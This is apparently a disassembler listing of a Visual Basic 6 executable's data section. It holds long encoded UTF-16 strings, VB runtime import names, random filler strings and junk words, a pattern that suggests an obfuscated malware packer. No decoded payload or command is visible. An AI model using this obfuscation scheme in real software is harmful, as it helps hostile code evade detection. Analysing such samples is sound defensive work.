.text:00403590                 text "UTF-16LE", '-6d6d652f333473667456',0
.text:004035BC                 dd 1Ah
.text:004035C0 aR8a817c86818f:                         ; DATA XREF: sub_40A806+7AD↓o
.text:004035C0                 text "UTF-16LE", 'R8a817c86818f',0
.text:004035DC                 dd 2
.text:004035E0 dword_4035E0    dd 68h, 1A2h            ; DATA XREF: sub_40D2C7+45↓o
.text:004035E8 aL6b5a5e615a5a6:                        ; DATA XREF: .text:00408E42↓o
.text:004035E8                 text "UTF-16LE", 'L6b5a5e615a5a6c705d625a5b6e5f6c625e5b5f5e6c625a705f'
.text:0040364E                 text "UTF-16LE", '5e63625e705f5f70706d705f6170706d5a5f6170706d705f5e6'
.text:004036B4                 text "UTF-16LE", '36262705f5f7070625a5f617070707070707070606d626f625a'
.text:0040371A                 text "UTF-16LE", '5b6d5d625b7063625e706e616e626f5f705d6c6f5c6d63626d7'
.text:00403780                 text "UTF-16LE", '05f5e',0
.text:0040378C                 text "UTF-16LE", ':',0
.text:00403790 aY8486855480818:                        ; DATA XREF: sub_40A806+2D9↓o
.text:00403790                 text "UTF-16LE", 'y848685548081847b888057758684',0
.text:004037CC                 dd 2
.text:004037D0 dword_4037D0    dd 6Dh, 0               ; DATA XREF: sub_40D2C7+B3↓o
.text:004037D8                 dd 0F2h
.text:004037DC aP8486867186758:                        ; DATA XREF: .text:00408EC0↓o
.text:004037DC                 text "UTF-16LE", 'p84868671867586798478857184878282878787878787848379'
.text:00403842                 text "UTF-16LE", '867484857684867a797187767687877a87738683757376797a7'
.text:004038A8                 text "UTF-16LE", '572837983757a857a79',0
.text:004038D0 aB:
.text:004038D0                 text "UTF-16LE", 'B',0
.text:004038D4 aG94a2a9a1ab9e8:                        ; DATA XREF: sub_40A806+72↓o
.text:004038D4                 text "UTF-16LE", 'G94a2a9a1ab9e85a2a9b2a1ac8ab1a284',0
.text:00403918                 text "UTF-16LE", '&',0
.text:0040391C aI7878703a77748:                        ; DATA XREF: sub_40A806+102↓o
.text:0040391C                 text "UTF-16LE", 'I7878703a7774847a7f',0
.text:00403944                 text "UTF-16LE", '"',0
.text:00403948 aS61786f767c7e7:                        ; DATA XREF: sub_40A806+19B↓o
.text:00403948                 text "UTF-16LE", 'S61786f767c7e7d76',0
.text:0040396C a2_1:
.text:0040396C                 text "UTF-16LE", '2',0
.text:00403970 aWc7c7bf898d8ec:                        ; DATA XREF: sub_40A806+23A↓o
.text:00403970                 text "UTF-16LE", 'Wc7c7bf898d8ec7c0c9cdc0c6',0
.text:004039A4                 dd 192h
.text:004039A8 aW3333333333333:                        ; DATA XREF: .text:00408F3E↓o
.text:004039A8                 text "UTF-16LE", 'w33333333333333333333333333333333333333333333333333'
.text:00403A0E                 text "UTF-16LE", '333333333333333333463933334639333337393333373a33334'
.text:00403A74                 text "UTF-16LE", '839333333333333353633333636333346393333383933334839'
.text:00403ADA                 text "UTF-16LE", '3333353a333338393333453933333333333348373b483339',0
.text:00403B3C                 dd 1Ch
.text:00403B40 aEqzqpkxvbzbgst:                        ; DATA XREF: sub_40A4A1+2D↓o
.text:00403B40                 text "UTF-16LE", 'eqzqpkxvbzbgst',0
.text:00403B5E                 align 10h
.text:00403B60                 dd 0
.text:00403B64                 dd 192h
.text:00403B68 aV8d8d9594948e9:                        ; DATA XREF: .text:00408FA1↓o
.text:00403B68                 text "UTF-16LE", 'v8d8d9594948e908e90919e948c8c8c8c8f8c9e9e94a18e909d'
.text:00403BCE                 text "UTF-16LE", '929fa29e949e918c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8'
.text:00403C34                 text "UTF-16LE", 'c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c'
.text:00403C9A                 text "UTF-16LE", '8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c8c',0
.text:00403CFC aVbastrcopy     db '__vbaStrCopy',0
.text:00403D09                 align 4
.text:00403D0C dword_403D0C    dd 0A4C466B8h, 101B499Fh, 0AA0078BBh, 0BB3C3800h, 0
.text:00403D0C                                         ; DATA XREF: sub_40A502+BF↓o
.text:00403D20                 dd 192h
.text:00403D24 a79767e7e7e8b7a:                        ; DATA XREF: .text:00409025↓o
.text:00403D24                 text "UTF-16LE", '}79767e7e7e8b7a78877c7c78877c767676767976777f7e8b76'
.text:00403D8A                 text "UTF-16LE", '76767676767a8c7e7c7878877c7676767679768a7f7e8b89798'
.text:00403DF0                 text "UTF-16LE", '77c8b77877c7f797f7e76767676797677877e8b877a877c7777'
.text:00403E56                 text "UTF-16LE", '7f7e76767676797687877e8b8b79877c89787a787a7b887e',0
.text:00403EB8 aVbaredim       db '__vbaRedim',0
.text:00403EC3                 align 4
.text:00403EC4                 dd 1F6h
.text:00403EC8 aU495250515e4a4:                        ; DATA XREF: .text:004090A9↓o
.text:00403EC8                 text "UTF-16LE", 'u495250515e4a4e5f5c4d4a515e5b4e514f494949494c495d4d'
.text:00403F2E                 text "UTF-16LE", '515e4b4a5a4f4949494949494d4d4a49505c52495b514949494'
.text:00403F94                 text "UTF-16LE", '94c495c4e515e5a4b5a4f494949494c495a4f515e4949494949'
.text:00403FFA                 text "UTF-16LE", '49515c514f4b4c5a4f494949494c494f50515e5c495a4f5e4b5'
.text:00404060                 text "UTF-16LE", 'a4f494949494c495f50515e494d5a4f5a4b5a4f49494949',0
.text:004040C0                 dd 12Eh
.text:004040C4 aL939097a4a1949:                        ; DATA XREF: .text:0040912D↓o
.text:004040C4                 text "UTF-16LE", 'l939097a4a19497958f8f8f8f928f929197a49190a0958fa3a5'
.text:0040412A                 text "UTF-16LE", 'a59092a5a59192a5a58f93a0958f8f8f8f928f919297a4a490a'
.text:00404190                 text "UTF-16LE", '09590a3a1978f8f8f8f928fa19297a4a492a0958f8f8f8f92',0
.text:004041F4 aVbar8str       db '__vbaR8Str',0
.text:004041FF                 align 10h
.text:00404200 aVbafpui1       db '__vbaFpUI1',0
.text:0040420B                 align 4
.text:0040420C                 dd 192h
.text:00404210 aX89899a8f899d9:                        ; DATA XREF: .text:004091B1↓o
.text:00404210                 text "UTF-16LE", 'X89899a8f899d9f9f8a8e908e898989898989919f918f92899b'
.text:00404276                 text "UTF-16LE", '91898989898b899a9f919e8b8b9a8f9a9f8c89928c9b9189898'
.text:004042DC                 text "UTF-16LE", '9898c898e89919e9e8c9a8f9c8c8a8e9b9192899b9189898989'
.text:00404342                 text "UTF-16LE", '8c898a8a919e9e8a9a8f898989898c899f8d919e8a8e9f9c',0
.text:004043A4 aVbastrmove     db '__vbaStrMove',0
.text:004043B1                 align 4
.text:004043B4 aVbai2i4        db '__vbaI2I4',0
.text:004043BE                 align 10h
.text:004043C0                 dd 192h
.text:004043C4 aM5a4f4d495a4f4:                        ; DATA XREF: .text:00409235↓o
.text:004043C4                 text "UTF-16LE", 'm5a4f4d495a4f49495a4f49495a4f4b4e504e494949494b494d'
.text:0040442A                 text "UTF-16LE", '5c515e4b4d5a4f4a4a5b51494949494b495d5c515e5a4b5a4f5'
.text:00404490                 text "UTF-16LE", '24c5b51494949494b494f5d515e5e4b5a4f494949494c494d4a'
.text:004044F6                 text "UTF-16LE", '515e4a4e4f4a4c5b5e5f5151514f494949494b49515e515e',0
.text:00404558 aVbastrcat      db '__vbaStrCat',0
.text:00404564                 dd 192h
.text:00404568 aR8988878c9b9b8:                        ; DATA XREF: .text:004092B9↓o
.text:00404568                 text "UTF-16LE", 'r8988878c9b9b8e85978d8585858587859a8d8d9a9a87968b86'
.text:004045CE                 text "UTF-16LE", '86978d8585858587858c8e8d9a8787968b8585858587858a998'
.text:00404634                 text "UTF-16LE", 'd9a868a879b85868c8885998d8b8585858587858e968d9a8786'
.text:0040469A                 text "UTF-16LE", '968b85999b9b86889b9b8585968b8585968b8585968b8585',0
.text:004046FC aVbafreestrlist db '__vbaFreeStrList',0
.text:0040470D                 align 10h
.text:00404710                 dd 192h
.text:00404714 aO9c9c868686868:                        ; DATA XREF: .text:0040933D↓o
.text:00404714                 text "UTF-16LE", 'O9c9c86868686868986868e8c868a978c8f86988e8686868688'
.text:0040477A                 text "UTF-16LE", '86878c8e9b9b88978c8f89988e8787988e868686868886998c8'
.text:004047E0                 text "UTF-16LE", 'e9b8888978c86868686888697978e9b878b9b8c97878b8f998f'
.text:00404846                 text "UTF-16LE", '8e8c8686868688869b8d8e9b8686978c869a9c9c87899c9c',0
.text:004048A8 aVbaarylock     db '__vbaAryLock',0
.text:004048B5                 align 4
.text:004048B8                 dd 192h
.text:004048BC aU5250535258656:                        ; DATA XREF: .text:004093C1↓o
.text:004048BC                 text "UTF-16LE", 'U52505352586565526156515062585050505052506352586552'
.text:00404922                 text "UTF-16LE", '526156515362585050505052505553586565536156595362585'
.text:00404988                 text "UTF-16LE", '050505052506553586552526156516462585050505052505754'
.text:004049EE                 text "UTF-16LE", '586556536156506466665153666654535757666650555257',0
.text:00404A50 aVbasetsystemer db '__vbaSetSystemError',0
.text:00404A64                 dd 192h
.text:00404A68 a7a7e8f8c7d7a81:                        ; DATA XREF: .text:00409445↓o
.text:00404A68                 text "UTF-16LE", '}7a7e8f8c7d7a818e8b7e817f797979797a79828f818e7b7a8a'
.text:00404ACE                 text "UTF-16LE", '7f798d8f8f8c797d8c7c81797979797b798c7c818e7a7e818d8'
.text:00404B34                 text "UTF-16LE", 'd7c8a7f7a8a817f797979797b79797a818e79798a7f7a7c8f8f'
.text:00404B9A                 text "UTF-16LE", '7d7c79808f8f7f7e7d7e80808f8f7b7e82798b8179797979',0
.text:00404BFC aVbaaryunlock   db '__vbaAryUnlock',0
.text:00404C0B                 align 4
.text:00404C0C                 dd 192h
.text:00404C10 a918e9c918b8b8b:                        ; DATA XREF: .text:004094C9↓o
.text:00404C10                 text "UTF-16LE", '~918e9c918b8b8b8b8b8b938d939d8b8b8b8b8b8b8b8b8c8b92'
.text:00404C76                 text "UTF-16LE", '9e8b8b8b8b8c8ba09e93a0918e9c918b9fa1a18c908d908d8b9'
.text:00404CDC                 text "UTF-16LE", 'c918b8b8b8b8c8b9d9f93a09c8e9c91918b8d9e8e938c8c9d93'
.text:00404D42                 text "UTF-16LE", '8b8b8b8b8c8b92a093a08d8d9c918b8b8b8b8d8b908d93a0',0
.text:00404DA4 aVbafreestr     db '__vbaFreeStr',0
.text:00404DB1                 align 4
.text:00404DB4                 dd 192h
.text:00404DB8 aQ9493a3989395a:                        ; DATA XREF: .text:0040954D↓o
.text:00404DB8                 text "UTF-16LE", 'q9493a3989395a8a894979a94a398929292929392989b9aa798'
.text:00404E1E                 text "UTF-16LE", '94a39893939592929292929392a89b9aa7a795a39892a695929'
.text:00404E84                 text "UTF-16LE", '292929292929aa894a5939aa5959497a49a9393a49a92929292'
.text:00404EEA                 text "UTF-16LE", '939295a49aa7a793a398939499a8929292929392a5a49aa7',0
.text:00404F4C aVbaerroroverfl db '__vbaErrorOverflow',0
.text:00404F5F                 align 10h
.text:00404F60                 dd 192h
.text:00404F64 aK686869687b6d7:                        ; DATA XREF: .text:004095D1↓o
.text:00404F64                 text "UTF-16LE", 'k686869687b6d707d6e6a796e696b6b686868686869686d6e70'
.text:00404FCA                 text "UTF-16LE", '7d7d6b796e6c69696f7a7071687a70716b7a706868686869686'
.text:00405030                 text "UTF-16LE", 'b6f707d6e6a796e687c7e7e7b686c7b6b706868686869686e7a'
.text:00405096                 text "UTF-16LE", '707d696d7e7b6c69707d7a6d706e6868686869687970707d',0
.text:004050F8 aVbastrtoansi   db '__vbaStrToAnsi',0
.text:00405107                 align 4
.text:00405108                 dd 192h
.text:0040510C aU4c4c4d4c5d4e5:                        ; DATA XREF: .text:00409655↓o
.text:0040510C                 text "UTF-16LE", 'u4c4c4d4c5d4e54614c4c5d524d4f62624e5152514c4d535362'
.text:00405172                 text "UTF-16LE", '624c51554c5e544c4c4c4c4d4c5e4f5461614e5d524d5f5e544'
.text:004051D8                 text "UTF-16LE", 'c4c4c4c4d4c5050546152505d52504f4d514f4c554c5e544c4c'
.text:0040523E                 text "UTF-16LE", '4c4c4d4c4c5154614e4e5d525f4c4d515e54554c5e544c4c',0
.text:004052A0 aVbastrtounicod db '__vbaStrToUnicode',0
.text:004052B2                 align 4
.text:004052B4                 dd 192h
.text:004052B8 a65667469797979:                        ; DATA XREF: .text:004096D9↓o
.text:004052B8                 text "UTF-16LE", '.656674697979797979796666686b7963747675666c63756b63'
.text:0040531E                 text "UTF-16LE", '636363646368636b787466746964646c6b64636576666b64647'
.text:00405384                 text "UTF-16LE", '56b63636363646366646b78696674696377797976636776666b'
.text:004053EA                 text "UTF-16LE", '63636363646369686b7864686b777766746964746b696363',0
.text:0040544C aVbacymul       db '__vbaCyMul',0
.text:00405457                 align 4
.text:00405458                 dd 192h
.text:0040545C a8b8e92899b9189:                        ; DATA XREF: .text:0040975D↓o
.text:0040545C                 text "UTF-16LE", '/8b8e92899b918989898989899a9c919e9e8b9a8f8a8a9b9189'
.text:004054C2                 text "UTF-16LE", '89898989898c9d919e8b8c9a8f898989898a898a8a919e8a8e9'
.text:00405528                 text "UTF-16LE", '18f909a909c8b9d918f8989898989898e9e919e89899a8f8989'
.text:0040558E                 text "UTF-16LE", '8a89898990898a89909c92899b918989898989898d9f919e',0
.text:004055F0 aVbacyi4        db '__vbaCyI4',0
.text:004055FA                 align 4
.text:004055FC                 dd 192h
.text:00405600 aJ7f7f7f7f83888:                        ; DATA XREF: .text:004097E1↓o
.text:00405600                 text "UTF-16LE", 'J7f7f7f7f8388879485839085808091877f7f7f7f7f7f938887'
.text:00405666                 text "UTF-16LE", '9494819085877f859282877f7f7f7f7f7f83908591918780829'
.text:004056CC                 text "UTF-16LE", '1877f7f7f7f7f7f959087948182908583828692828788829187'
.text:00405732                 text "UTF-16LE", '7f7f7f7f7f7f91918794818190857f939595837f80869595',0
.text:00405794 aVbacyadd       db '__vbaCyAdd',0
.text:0040579F                 align 10h
.text:004057A0                 dd 192h
.text:004057A4 aQ686e707d6a6b7:                        ; DATA XREF: .text:00409865↓o
.text:004057A4                 text "UTF-16LE", 'q686e707d6a6b796e6c6b696d6b68706a696d7a7071687a7068'
.text:0040580A                 text "UTF-16LE", '68686868687e6e707d6a6a796e687c7e7e7b686c7b6b7068686'
.text:00405870                 text "UTF-16LE", '86868686a7a707d696d707c7c6b796e6979706e686868686868'
.text:004058D6                 text "UTF-16LE", '6e70707d6868796e6a6b7e7e6e6d6f6d6c68796e696d6868',0
.text:00405938 aMsvbvm60Dll_0  db 'MSVBVM60.DLL',0
.text:00405945                 align 4
.text:00405948 aDllfunctioncal db 'DllFunctionCall',0
.text:00405958                 dd 0
.text:0040595C                 dd 192h
.text:00405960 aV5151443b4d433:                        ; DATA XREF: .text:004098E9↓o
.text:00405960                 text "UTF-16LE", 'v5151443b4d433b3b3b3b3b3b3f3e4350503d4c413c4f4d433b'
.text:004059C6                 text "UTF-16LE", '3b3b3b3b3b4f3e43503d3e4c413b3b3b3b3b3b4d4243503c404'
.text:00405A2C                 text "UTF-16LE", '350424c424e3e4f43413b3b3b3b3b3b513f43503b3b4c413c3c'
.text:00405A92                 text "UTF-16LE", '44433b3b3b3b3b3b3b4d3c4e3c43443b4d433b3b3b3b3b3b',0
.text:00405AF4 aVbastrcmp      db '__vbaStrCmp',0
.text:00405B00                 dd 192h
.text:00405B04 aR9389849482878:                        ; DATA XREF: .text:0040996D↓o
.text:00405B04                 text "UTF-16LE", 'r93898494828782839389818181818181858189969285928781'
.text:00405B6A                 text "UTF-16LE", '9597978581828897978a8193898181818181818382899696839'
.text:00405BD0                 text "UTF-16LE", '287818181818181818689968286968a92859784898989878181'
.text:00405C36                 text "UTF-16LE", '818181818583899681819287819597978581828897978384',0
.text:00405C98                 text "UTF-16LE", ' ',0
.text:00405C9C aCrnonqgkpjjunp:                        ; DATA XREF: sub_40A502+2F↓o
.text:00405C9C                 text "UTF-16LE", 'crnonqgkpjjunpjl',0
.text:00405CBE                 align 10h
.text:00405CC0                 dd 192h
.text:00405CC4 aY33323b3a48484:                        ; DATA XREF: .text:004099F1↓o
.text:00405CC4                 text "UTF-16LE", 'Y33323b3a48484848484848453a473633363436394848324648'
.text:00405D2A                 text "UTF-16LE", '48323243383a3336343639484832323232323332323a3832364'
.text:00405D90                 text "UTF-16LE", '33832323232323247333a473337333b4843434536373a384848'
.text:00405DF6                 text "UTF-16LE", '4848484834483a4732324338354536323634453635324445',0
.text:00405E58 aVbafreevar     db '__vbaFreeVar',0
.text:00405E65                 align 4
.text:00405E68                 dd 192h
.text:00405E6C aL58585c5a5b5a5:                        ; DATA XREF: .text:00409A75↓o
.text:00405E6C                 text "UTF-16LE", 'L58585c5a5b5a585a565a575a5a5a58685d555968585d555555'
.text:00405ED2                 text "UTF-16LE", '5555555d585d6a555a5d555957595c6b6b55696b6b595559575'
.text:00405F38                 text "UTF-16LE", '95c6b6b5d555968585d55555555555567595d6a555a686a6a55'
.text:00405F9E                 text "UTF-16LE", '6a5959665d5b55555555555557575d6a586855565968585d',0
.text:00406000 aVbaarydestruct db '__vbaAryDestruct',0
.text:00406011                 align 4
.text:00406014                 dd 192h
.text:00406018 aH9796949692969:                        ; DATA XREF: .text:00409AF9↓o
.text:00406018                 text "UTF-16LE", 'H9796949692969396969694a4a596a2969a96a396a696a79696'
.text:0040607E                 text "UTF-16LE", 'a4a39998a6a3a693919598a395a794919998919598a397a7949'
.text:004060E4                 text "UTF-16LE", '19994a796989992989599949794a3999193a698a3999991a697'
.text:0040614A                 text "UTF-16LE", 'a399a4929798a399a4919798a39991949198a399959791a4',0
.text:004061AC aVbafpi2        db '__vbaFpI2',0
.text:004061B6                 align 4
.text:004061B8                 dd 192h
.text:004061BC aZ8a8d808e7b788:                        ; DATA XREF: .text:00409B7D↓o
.text:004061BC                 text "UTF-16LE", 'z8a8d808e7b788c788e8b798b7f787c7f788b7c808b898b8e78'
.text:00406222                 text "UTF-16LE", '8b7b7b8e8e7b7b7d8e7b788a807c7b8a80817c787b7b8d8c8c7'
.text:00406288                 text "UTF-16LE", 'b78787a897d8a808079897c8a807d8c7b78807f807a7c7d8a80'
.text:004062EE                 text "UTF-16LE", '8b7b7d7c8a807b7c7c7f8c8d7d808b797c7a8b7e8a807f7d',0
.text:00406350 aVbafpi4        db '__vbaFpI4',0
.text:0040635A                 align 4
.text:0040635C                 dd 132h
.text:00406360 aM4949494949494:                        ; DATA XREF: .text:00409C01↓o
.text:00406360                 text "UTF-16LE", 'M49494949494949494c5c4c5c5d4e5a4e524e5b4e5e4e5f4e4e'
.text:004063C6                 text "UTF-16LE", '5c4c495b514d495b515d5d4c495c4a5a4e5b515b4d5c495b514'
.text:0040642C                 text "UTF-16LE", 'f4f5d5d4c494d4b5a4e5b514a5e4e50494b4d4b5c505b4c4d5f'
.text:00406492                 text "UTF-16LE", 0
.text:00406494 aVbastrvarmove  db '__vbaStrVarMove',0
.text:004064A4 aVbavardup      db '__vbaVarDup',0
.text:004064B0                 db '&',0
.text:004064B2                 align 4
.text:004064B4 aU7d53548e86959:                        ; DATA XREF: sub_40A806+84C↓o
.text:004064B4                 text "UTF-16LE", 'u7d53548e8695949a94',0
.text:004064DC a2_2:
.text:004064DC                 text "UTF-16LE", '2',0
.text:004064E0 aS798c794282837:                        ; DATA XREF: sub_40A806+8EB↓o
.text:004064E0                 text "UTF-16LE", 'S798c794282837b8380827d8b',0
.text:00406514                 text "UTF-16LE", '.',0
.text:00406518 aC3d6c38cd2d1cd:                        ; DATA XREF: sub_40A806+98A↓o
.text:00406518                 text "UTF-16LE", '/c3d6c38cd2d1cdc6c1d4d1',0
.text:00406548                 dd 6
.text:0040654C aG8b:                                   ; DATA XREF: sub_40A806+A29↓o
.text:0040654C                 text "UTF-16LE", 'g8b',0
.text:00406554                 dd 16h
.text:00406558 aQc8bdbdc4ab:                           ; DATA XREF: sub_40A806+AC8↓o
.text:00406558                 text "UTF-16LE", 'qc8bdbdc4ab',0
.text:00406570                 dd 12h
.text:00406574 aMbfbcb4a3:                             ; DATA XREF: sub_40A806+B67↓o
.text:00406574                 text "UTF-16LE", 'Mbfbcb4a3',0
.text:00406588                 dd 0Eh
.text:0040658C aK867885:                               ; DATA XREF: sub_40B485+72↓o
.text:0040658C                 text "UTF-16LE", 'K867885',0
.text:0040659C aR:
.text:0040659C                 text "UTF-16LE", 'R',0
.text:004065A0 aU59918a7986815:                        ; DATA XREF: sub_40B485+102↓o
.text:004065A0                 text "UTF-16LE", 'U59918a7986815a876c7f86818a8c6b8c88918a5b',0
.text:004065F4                 dd 16h
.text:004065F8 aM7b7b73837d:                           ; DATA XREF: sub_40B485+192↓o
.text:004065F8                 text "UTF-16LE", 'M7b7b73837d',0
.text:00406610 a2_3:
.text:00406610                 text "UTF-16LE", '2',0
.text:00406614 aIaccec7b6c7b7b:                        ; DATA XREF: sub_40B485+222↓o
.text:00406614                 text "UTF-16LE", 'iaccec7b6c7b7bea1b9b6c4a1',0
.text:00406648                 text "UTF-16LE", '>',0
.text:0040664C aA1c28fafadbcbf:                        ; DATA XREF: sub_40B485+2B2↓o
.text:0040664C                 text "UTF-16LE", ',a1c28fafadbcbfb9bdaf9caeb8b390',0
.text:0040668C                 dd 1Ch
.text:00406690 aVkzovxhrwxkhpt:                        ; DATA XREF: sub_40D1A8+2D↓o
.text:00406690                 text "UTF-16LE", 'vkzovxhrwxkhpt',0
.text:004066AE                 align 10h
.text:004066B0                 dd 212h
.text:004066B4 aK89998f999a8b9:                        ; DATA XREF: sub_40A806+C06↓o
.text:004066B4                 text "UTF-16LE", 'K89998f999a8b999b8f8e988b9b8b9c8b8c868f8e8a869b9b89'
.text:0040671A                 text "UTF-16LE", '8e8e868b8d988e8e9a8f8e86868686868686868c868d99999b8'
.text:00406780                 text "UTF-16LE", 'b8d86868f9c898e8c8c87868699898e87868c99898e8f9c8f8e'
.text:004067E6                 text "UTF-16LE", '8c8c9b898f8e8e89988e898a8a868a888a8a8f8e9989868a988'
.text:0040684C                 text "UTF-16LE", 'e8687868a988e868686868686868987978a8c8e868b8d988e8b'
.text:004068B2                 text "UTF-16LE", '9b8f8e8b8b',0
.text:004068C8 a2_4:
.text:004068C8                 text "UTF-16LE", '2',0
.text:004068CC aQb3b1c0c3bdc1b:                        ; DATA XREF: sub_40B485+342↓o
.text:004068CC                 text "UTF-16LE", 'Qb3b1c0c3bdc1b3a0b2afbd9a',0
.text:00406900 aN:
.text:00406900                 text "UTF-16LE", 'N',0
.text:00406904 aV9386878796639:                        ; DATA XREF: sub_40B485+3D2↓o
.text:00406904                 text "UTF-16LE", 'V93868787966394948693918e908486658d9573',0
.text:00406954 a2_5:
.text:00406954                 text "UTF-16LE", '2',0
.text:00406958 aNb2b0bfc2bcc0b:                        ; DATA XREF: sub_40B485+471↓o
.text:00406958                 text "UTF-16LE", 'nb2b0bfc2bcc0b29fb8b0bc99',0
.text:0040698C                 text "UTF-16LE", ':',0
.text:00406990 aQc7c5d4d7d1d5c:                        ; DATA XREF: sub_40B485+510↓o
.text:00406990                 text "UTF-16LE", 'qc7c5d4d7d1d5c7b4c8d1c7dccbb5',0
.text:004069CC                 dd 1Eh
.text:004069D0 aG38397a767f784:                        ; DATA XREF: sub_40B485+5AF↓o
.text:004069D0                 text "UTF-16LE", 'g38397a767f7849',0
.text:004069F0                 text "UTF-16LE", '*',0
.text:004069F4 aOc2d5c28bc2c2c:                        ; DATA XREF: sub_40BAAD+70↓o
.text:004069F4                 text "UTF-16LE", 'oc2d5c28bc2c2cdd6c8d0',0
.text:00406A20                 dd 1Ah
.text:00406A24 aZd1c8c3cdc8d6:                         ; DATA XREF: sub_40BAAD+100↓o
.text:00406A24                 text "UTF-16LE", 'Zd1c8c3cdc8d6',0
.text:00406A40                 dd 1Ah
.text:00406A44 aRc4c4cfd8cab2:                         ; DATA XREF: sub_40BAAD+17D↓o
.text:00406A44                 text "UTF-16LE", 'rc4c4cfd8cab2',0
.text:00406A60                 dd 1Ah
.text:00406A64 a8d847f898492:                          ; DATA XREF: sub_40BAAD+237↓o
.text:00406A64                 text "UTF-16LE", '~8d847f898492',0
.text:00406A80                 dd 1Ah
.text:00406A84 aSkyrlvqqhheyb:                         ; DATA XREF: sub_40D0DD+2D↓o
.text:00406A84                 text "UTF-16LE", 'skyrlvqqhheyb',0
.text:00406AA0                 dd 21Eh
.text:00406AA4 aPiabdyoxwacnyt:                        ; DATA XREF: sub_40C2A0+2D↓o
.text:00406AA4                 text "UTF-16LE", 'piabdyoxwacnytilhpcudssbyalbkixduolugumsqrdrvtfmmlo'
.text:00406B0A                 text "UTF-16LE", 'ezjlnhztgiwgjtqfooummfxfnivkzovxhrwxkhptcrnonqgkpjj'
.text:00406B70                 text "UTF-16LE", 'unpjlskyrlvqqhhfolnyukgkiqhipscnaerxqcbwmualrgdjcgn'
.text:00406BD6                 text "UTF-16LE", 'bbsbrzwzjbigwbswtetuozcpzsdkkjmccxhjlfxrfguehrydmdn'
.text:00406C3C                 text "UTF-16LE", 'lkadvdlhtrmyvfpvifznapvvuyejoihsvxrjeqsqtoxffydwavc'
.text:00406CA2                 text "UTF-16LE", 'oowstyeqduqacygm',0
.text:00406CC4 aVbavartstgt    db '__vbaVarTstGt',0
.text:00406CD2                 align 4
.text:00406CD4 aVbaredimpreser db '__vbaRedimPreserve',0
.text:00406CE7                 align 4
.text:00406CE8 aVbafreevarlist db '__vbaFreeVarList',0
.text:00406CF9                 align 4
.text:00406CFC aVbafreeobj     db '__vbaFreeObj',0
.text:00406D09                 align 4
.text:00406D0C aVbaobjset      db '__vbaObjSet',0
.text:00406D18 aVbaui1i2       db '__vbaUI1I2',0
.text:00406D23                 align 4
.text:00406D24 aVbavarmove     db '__vbaVarMove',0
.text:00406D31                 align 4
.text:00406D34 dword_406D34    dd 31CCFFh, 0F639D601h, 527AD8A6h, 3E0CA445h, 469B5E9Ch
.text:00406D34                                         ; DATA XREF: .text:00401768↑o
.text:00406D48                 dd 8024ED69h, 0C472AACCh, 0FC9874Ch, 207ADF34h, 0AD4F3ABBh
.text:00406D5C                 dd 0CF669933h, 0CB711h, 0D36000AAh, 93h, 8 dup(0)
.text:00406D8C                 dd 5E00h, 3B00h, 60000h, 696B6163h, 0D007265h, 62000801h
.text:00406DA4                 dd 68747265h, 676E69h, 42000119h, 0FFFF2300h, 2EFFFFh
.text:00406DB8                 dd 1BF35h, 0FD900h, 0CF4F00h, 246D00h, 0FF034600h, 1C01h
.text:00406DD0                 dd 60100h, 6F626E49h, 9003361h, 78802h, 6A008903h, 90Ch
.text:00406DE8                 dd 402FFh
.text:00406DEC dword_406DEC    dd 31CCFFh, 61599A01h, 83D144A7h, 0AD708E47h, 113761A9h
.text:00406DEC                                         ; DATA XREF: .text:00401718↑o
.text:00406E00                 dd 0A46793DFh, 8299B736h, 23B7BA43h, 0A95DD887h, 0AD4F3AA3h
.text:00406E14                 dd 0CF669933h, 0CB711h, 0D36000AAh, 93h, 8 dup(0)
.text:00406E44                 dd 6000h, 4000h, 0A0000h, 63696863h, 6173616Bh, 0D007377h
.text:00406E5C                 dd 52000901h, 766F6E65h, 38657461h, 11900h, 0FF230042h
.text:00406E70                 dd 2EFFFFFFh, 2383500h, 14760000h, 0BB340000h, 0D1BA0000h
.text:00406E84                 dd 3460000h, 1901FFh, 6010000h, 74664100h, 377265h, 66C0416h
.text:00406E9C                 dd 44C0615h, 2FF080Eh, 4
.text:00406EA8 dword_406EA8    dd 31CCFFh, 0DD2C8101h, 0A654833Fh, 7CFF8B43h, 0C839F641h
.text:00406EA8                                         ; DATA XREF: .text:00401808↑o
.text:00406EBC                 dd 1CDE41C5h, 0D327FFD5h, 261D9A4Ah, 0CEEC2BF7h, 0AD4F3A06h
.text:00406ED0                 dd 0CF669933h, 0CB711h, 0D36000AAh, 93h, 8 dup(0)
.text:00406F00                 dd 6600h, 3A00h, 50000h, 6B6F7242h, 10D0065h, 61440008h
.text:00406F18                 dd 656C7070h, 19003873h, 420001h, 0FFFFFF23h, 35002EFFh
.text:00406F2C                 dd 1ADh, 1A4Fh, 436h, 7DDAh, 1FF0346h, 25h, 41000501h
.text:00406F48                 dd 366C616Eh, 6010400h, 61766100h, 736C69h, 8045404h, 6E087D08h
.text:00406F60                 dd 110Bh, 402FFh
.text:00406F68 dword_406F68    dd 31CCFFh, 17BDA301h, 0B48A8024h, 4CA8A4Ch, 4378D097h
.text:00406F68                                         ; DATA XREF: .text:004017B8↑o
.text:00406F7C                 dd 4FE1B23h, 492F3D03h, 43028148h, 4BAC26DEh, 0AD4F3AD2h
.text:00406F90                 dd 0CF669933h, 0CB711h, 0D36000AAh, 93h, 8 dup(0)
.text:00406FC0 dword_406FC0    dd 7400h, 4400h, 0A0000h, 6D6F6261h, 74616E69h, 0D007365h
.text:00406FD8                 dd 41000D01h, 6E69746Eh, 656C6375h, 32736E6Fh, 11900h
.text:00406FEC                 dd 0FF230042h, 2EFFFFFFh, 1AB3500h, 69A0000h, 84880000h
.text:00407000                 dd 24DE0000h, 3460000h, 2901FFh, 8010000h, 626D4500h, 7265776Fh
.text:00407018                 dd 1040038h, 65640007h, 6F726477h, 0F3040070h, 3A05CE07h
.text:0040702C                 dd 110CC407h, 2FF0000h, 4, 4070ECh, 407110h, 40717Ch, 4070C8h
.text:00407048                 dd 40765Ch, 0
.text:00407050                 dd offset aCastrated    ; "Castrated"
.text:00407054                 align 8
.text:00407058                 dd offset aAdjourned    ; "adjourned"
.text:0040705C                 dd offset aHangfire6    ; "Hangfire6"
.text:00407060                 dd offset aDoest        ; "doest"
.text:00407064                 dd offset aBaulked      ; "Baulked"
.text:00407068                 dd offset aCanons       ; "Canons"
.text:0040706C                 dd offset aBoatload     ; "Boatload"
